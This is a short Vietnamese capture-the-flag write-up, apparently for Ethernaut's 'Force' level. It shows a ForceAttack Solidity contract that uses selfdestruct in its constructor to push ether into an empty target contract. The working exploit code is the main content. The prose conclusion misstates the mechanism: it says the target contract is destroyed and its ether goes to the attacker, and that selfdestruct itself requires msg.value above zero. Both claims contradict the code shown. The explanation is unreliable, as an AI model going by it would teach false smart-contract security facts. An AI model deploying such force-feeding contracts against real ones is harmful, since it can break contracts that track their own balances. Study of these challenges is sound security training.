### Kết luận
- Lỗ hổng: Kẻ tấn công có thể sử dụng hàm `selfdestruct` để tấn công vào hợp đồng có địa chỉ `muctieu`, điều này sẽ khiến cho hợp đồng bị hủy và toàn bộ ether của hợp dồng sẽ rơi vào tay của kẻ tấn công `msg.sender`.
- Cách phòng ngừa: Thêm `require` chỉ cho phép người `owner` của hợp dồng mới có thể sử dụng hàm `selfdestruct`, kiểm soát những người có thể gửi ether, không cho `selfdestruct` tùy ý.
- Một số lưu ý: Hàm `selfdestruct` yêu cầu `msg.value` phải > 0 nếu không sẽ không thực hiện.
### Contract tấn công
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract ForceAttack{
    constructor (address payable muctieu) payable { //Dia chi co the nhan Ether (payable)
        require(msg.value >0);
        selfdestruct(muctieu);
    }
}
```
### Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```
